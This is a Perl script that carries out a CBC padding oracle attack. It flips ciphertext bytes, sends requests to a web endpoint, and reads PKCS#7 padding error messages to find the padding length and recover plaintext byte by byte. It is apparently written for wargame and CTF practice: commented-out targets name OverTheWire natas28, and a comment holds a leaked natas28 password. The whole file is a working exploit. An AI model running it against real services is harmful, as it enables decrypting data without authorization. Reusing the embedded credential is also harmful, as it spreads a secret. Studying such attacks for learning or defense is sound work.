#!/usr/bin/perl
use strict;
use warnings;
use HTTP::Tiny;# https://perldoc.perl.org/HTTP/Tiny.html
use MIME::Base64; 
use URI::Escape;#  http://search.cpan.org/perldoc/URI::Escape
use Encode qw(decode encode);
use List::MoreUtils qw(any);

print "Ich beginne\n";

my $bSize = 16; # Currently even though this variable is in use , the block size is hardcoded.

my $AIM = 0;

my @text = ();

my @wante = ('ValueError: Padding is incorrect.', 'ValueError: PKCS#7 padding is incorrect.');

my $parm = 'Vnzg%2FphSRCvTfBXyZw%2F437nNgYWtHuCn2f1S5uJpJ0cDC4jqsnGMXRAyMx6dbo1bNLSJWFfCc1T2YaeYsy2sEC5I2tFMwS%2BKOpaw9Uo1olw%3D';
#my $parm = 'G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPJ3JtkSaJRrJwlP%2BDsbHXlYKSh%2FPMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY%3D';
#my $parm = 'ULp-Dd93!!pZmzC6q7CnFh9AOMB6NdDJpT5FtFwdPAU4ctEYKuzA14gvyHodr60GOgXDSDIm2PFrp5jLvlQS5ofQGpTrPoQDGq4yl25-QEgSOsYTzV9XidDTHtXncxYmz25bKUDqCz3KZSI0xdbMcyRI7lxDWwtR5MLu!RHzANbyyZwnY037m66XCA-XjMzJbheQcjc5O5yLfLW9iwFDNA~~';

#$parm =~ s/-/+/ig;
#$parm =~ s/!/\//ig;
#$parm =~ s/~/=/ig;

my $url = 'http://127.0.0.1:5000/?cte=';
# Figure out how to redact stuff like this for future reference
#my $url = 'http://natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF@natas28.natas.labs.overthewire.org/search.php/?query='; # Whoops I didn't mean to post this, but I guess since Its already on the interwebs not much point in removing instantly.
#

#my $url = 'http://35.227.24.107/e4fe34027d/?post=';

$parm = uri_unescape($parm);

$parm = decode_base64($parm);

my $qLen = length($parm)-1;

print "String Length: ".$qLen."\n";

#my $octets = decode("UTF-8", $parm);
#print $octets."\n";

# Padding length
my $tempPARM = $parm;
my $it = 6;
my $currentB = $qLen-($bSize+$it);

substr($tempPARM, $currentB, 1) = chr(ord(substr($tempPARM, $currentB, 1))^255);
my $return = getRequest($tempPARM);
my $limit = 0;
if ($return == 1){$it = 0; $limit = 5;}else{$it = $it + 2; $limit = 17;} # edit this to reflect changes of the #bSize variable

while ($it < $limit){
    $tempPARM = $parm;
    $currentB = $qLen-($bSize+$it);

    substr($tempPARM, $currentB, 1) = chr(ord(substr($tempPARM, $currentB, 1))^255);
    $return = getRequest($tempPARM);
    if ($return == 1){ # Test  if using a ($return) statment works
        if ($it == 0){
            $AIM = 0;
        }else{
            $tempPARM = $parm;
            $it--;
            $currentB = $qLen-($bSize+$it);

            substr($tempPARM, $currentB, 1) = chr(ord(substr($tempPARM, $currentB, 1))^255);
            $return = getRequest($tempPARM);
            if ($return == 1){
                $AIM = $it; #Maybe do some inital arithmetic here
            }else{
                $AIM = $it+1; #Maybe do some inital arithmetic here
            }
        }
        last;
    }else{
        $it = $it + 2;
    }
}
if ($it == 18){
    $AIM = 16; #Maybe do some inital arithmetic here
}

my $ill = 0;
while ($ill < $AIM){
    push @text, $AIM;
    $ill++;
}
#

print "\nPadding Size: $AIM\n\n";

$it = $AIM;
my $target = $AIM+1;
while($it < $bSize){
    $tempPARM = $parm;
    prep( );
    $currentB = $qLen-($bSize+$it);
    my $ogByte = ord(substr($parm, $currentB, 1));
    my $byte = ord(substr($parm, $currentB, 1)) ;
    my $whBYTE = $byte;
    $byte++;
    print "it = $it\n";
    while($byte != $whBYTE){
        substr($tempPARM, $currentB, 1) = chr($byte);
        $return = getRequest($tempPARM);
        if ($return == 1){
            my $xD = $byte^$ogByte^$target;
            print "Plain Text: $xD\n";
            push @text, $xD;
            $AIM++;
            $target++;
            last;
        }else{
            $byte = ($byte + 1)%256; 
        }
    }
    $it++;
}

print "\n";

my @plainText = reverse(@text);
foreach( @plainText ){
    print chr($_);
} 
print "\n\n";

sub prep { # Prep paddings (turns something like \x03\x03\x03 to \x04\x04\x04)
    my $tilAIM = 0;
    while ($tilAIM < $AIM){
        $currentB = $qLen-($bSize+$tilAIM);
        substr($tempPARM, $currentB, 1) = chr(ord(substr($parm, $currentB, 1))^$target^$text[$tilAIM]);
        $tilAIM++;
    }
}

sub getRequest {
    my $heel = uri_escape(encode_base64($_[0], ''));
    my $response = HTTP::Tiny->new->get($url.$heel);
    if (not any { $response->{content} =~ $_ } @wante){
        return 1;
    }
    else{
        return 0;
    }
}